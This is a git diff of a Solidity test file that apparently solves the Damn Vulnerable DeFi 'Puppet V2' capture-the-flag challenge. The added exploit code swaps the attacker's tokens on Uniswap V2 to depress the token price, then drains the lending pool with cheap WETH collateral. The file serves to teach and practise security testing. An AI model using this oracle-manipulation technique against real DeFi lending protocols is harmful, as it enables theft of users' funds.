@@ -51,10 +51,10 @@ contract PuppetV2 is Test {
         // Deploy token to be traded in Uniswap
         dvt = new DamnValuableToken();
         vm.label(address(dvt), "DVT");
-        
+
         weth = new WETH9();
         vm.label(address(weth), "WETH");
- 
+
         // Deploy Uniswap Factory and Router
         uniswapV2Factory = IUniswapV2Factory(
             deployCode(
@@ -118,12 +118,39 @@ contract PuppetV2 is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-        uint256 bait = puppetV2Pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
-        console.log(bait / 1 ether);
         vm.startPrank(attacker);
-        dvt.approve(address(uniswapV2Pair), type(uint256).max);
-        uniswapV2Pair.swap(ATTACKER_INITIAL_TOKEN_BALANCE, ATTACKER_INITIAL_ETH_BALANCE, address(attacker), bytes0);
+        dvt.approve(address(uniswapV2Router), type(uint256).max);
+        // Now, you can create an array of addresses and add the dvt and weth addresses to it
+        address[] memory tokenAddresses = new address[](2);
+        tokenAddresses[0] = address(dvt);
+        tokenAddresses[1] = address(weth);
+
+        // Finally, you can use the getAmountsOut function to get the weth amount
+        uint256[] memory array = uniswapV2Router.getAmountsOut(
+            1000e18,
+            tokenAddresses
+        );
+        console.log(array[0] / 1 ether);
+        console.log(array[1] / 1 ether);
+        
+        
+        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            ATTACKER_INITIAL_TOKEN_BALANCE,
+            0,
+            tokenAddresses,
+            address(attacker),
+            DEADLINE
+        );
+
+        uint256 bait = puppetV2Pool.calculateDepositOfWETHRequired(
+            POOL_INITIAL_TOKEN_BALANCE
+        );
+        console.log(bait / 1 ether);
+        weth.deposit{ value: bait }();
+        weth.approve(address(puppetV2Pool), type(uint256).max);
+        puppetV2Pool.borrow(POOL_INITIAL_TOKEN_BALANCE);
         vm.stopPrank();
+        
         /** EXPLOIT END **/
         validation();
     }
